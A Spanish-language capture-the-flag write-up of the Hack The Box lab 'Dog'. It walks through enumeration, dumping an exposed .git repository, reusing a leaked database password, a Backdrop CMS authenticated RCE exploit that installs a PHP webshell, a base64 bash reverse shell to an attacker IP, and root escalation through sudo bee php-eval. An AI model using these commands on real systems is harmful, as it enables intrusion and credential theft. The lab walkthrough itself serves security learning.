+ Machine Name: Dog
+ IP: 10.129.172.236
+ OS: Linux
+ Difficulty: Easy

# Enumeracion

## Nmap

Primer escaneo:

```
nmap -p- -sS -Pn -n --open -vvv --min-rate 1000 -oG allports 10.129.172.236
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Puertos 80 http y 22 ssh abiertos.

Escaneo detallado:

```
nmap -p22,80 -sCV -oN targeted 10.129.172.236
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Home | Dog
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-git: 
|   10.129.172.236:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap revela un repositorio de github en  /.git.

![git.png](Images/git.png)

Con [GitHack](https://github.com/lijiejie/GitHack) extraigo el repositorio:

```
python3 GitHack/GitHack.py http://10.129.172.236/.git/
```

```
root@kali /home/cangrejo/Escritorio/dog/Content/10.129.172.236 # ls -l 
total 80
drwxr-xr-x 9 root root  4096 jul 13 15:43 core
drwxr-xr-x 7 root root  4096 jul 13 15:43 files
-rw-r--r-- 1 root root   578 jul 13 15:43 index.php
drwxr-xr-x 2 root root  4096 jul 13 15:43 layouts
-rw-r--r-- 1 root root 18092 jul 13 15:43 LICENSE.txt
-rw-r--r-- 1 root root  5285 jul 13 15:43 README.md
-rw-r--r-- 1 root root  1198 jul 13 15:43 robots.txt
-rw-r--r-- 1 root root 21732 jul 13 15:43 settings.php
drwxr-xr-x 2 root root  4096 jul 13 15:43 sites
drwxr-xr-x 2 root root  4096 jul 13 15:43 themes
```

En el archivo `settings.php` se encuentra una contraseña para el usuario root:

```
<?php
<..snip..>
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';
<..snip..>
```

Las credenciales no son válidas para root:

![root.png](Images/root.png)

El login permite autenticación mediante nombre de usuario o dirección de correo.

En la pagina principal en `About` se observa el dominio `dog.htb`:

![about.png](Images/about.png)

Uso `grep` para buscar de forma recursiva `dog.htb`:

```
grep -r "dog.htb"
```

```
files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

Usuario `tiffany@dog.htb`.

La contraseña es valida para `tiffany`:

![login.png](Images/login.png)

![cms.png](Images/cms.png)

En la lista de módulos se observa una posible versión de `backdrop`:

![version.png](Images/version.png)

con `serachsploit` busco si existen exploits para esa versión de `Backdorp`:

```
Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)                                                                                          | php/webapps/52021.py
```

```
searchsploit -x php/webapps/52021.py
```

El script crea un modulo con una web shell en php y lo comprime en un .zip:

```
searchsploit -m php/webapps/52021.py
```

`-m` es para copiar el exploit en el directorio actual.

```
python3 52021.py http://10.129.172.236/
```

```
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://10.129.172.236//admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://10.129.172.236//modules/shell/shell.php
```

Al intentar instalar el modulo me devuelve un error:

![zip.png](Images/zip.png)

El modulo debe estar en `tar.gz`.

Descomprimo el .zip y lo vuelvo a comprimir en tar.gz:

```
tar -czvf shell.tar.gz shell
```

Instalo el modulo:

![tar.gz.png](Images/tar.gz.png)

en `http://10.129.172.236/modules/shell/shell.php` se encuentra la webshell:

![webshell.png](Images/webshell.png)

# Shell como www-data

Reverse shell en base64:

```
echo "bash -i >& /dev/tcp/10.10.14.244/443 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNDQvNDQzIDA+JjEK
```

![shell.png](Images/shell.png)

Terminal en escucha:

```
listening on [any] 443 ...
connect to [10.10.14.244] from (UNKNOWN) [10.129.172.236] 38858
bash: cannot set terminal process group (1012): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dog:/var/www/html/modules/shell$ whoami
whoami
www-data
```

La flag `user.txt` se encuentra en el directorio home de `johncusack` pero no se puede leer:

```
www-data@dog:/home/johncusack$ cat user.txt
cat: user.txt: Permission denied
```

# PrivEsc
## Reutilizacion de contraseñas

La contraseña de `tiffany@dog.htb` se reutiliza para el usuario `johncusack`:

```
www-data@dog:/home/johncusack$ su johncusack
Password: 
johncusack@dog:~$ whoami
johncusack
```

Flag `user.txt`:

```
johncusack@dog:~$ cat /home/johncusack/user.txt
80bf7f**************************
```
## Sudo

el usuario `johncusack` puede ejecutar como cualquier usuario el binario `bee`:

```
User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

El binario `bee` es una herramienta de linea de comandos proporcionada por `Backdrop CMS` 
que permite a los administradores gestionar CMS desde la termial.

Al ejecutarlo muestra varias opciones que se pueden usar, la mas interesante es `php-eval`:

![bee.png](Images/bee.png)

```
sudo bee --root=/var/www/html php-eval 'system("whoami")'
```

+ `--root=/var/www/html` es para indicar el directorio root de la instalación de backdrop a usar.
+ `php-eval` ejecuta codigo php arbitrario.
+ `system("whoami")` codigo php.

```
johncusack@dog:~$ sudo bee --root=/var/www/html php-eval 'system("whoami")'
root
```

shell root:

```
sudo bee --root=/var/www/html php-eval 'system("bash -p")'
```

```
root@dog:/var/www/html# whoami
root
```

Flag `root.txt`:

```
root@dog:/var/www/html# cat /root/root.txt
5c2522**************************
```

# 🦀
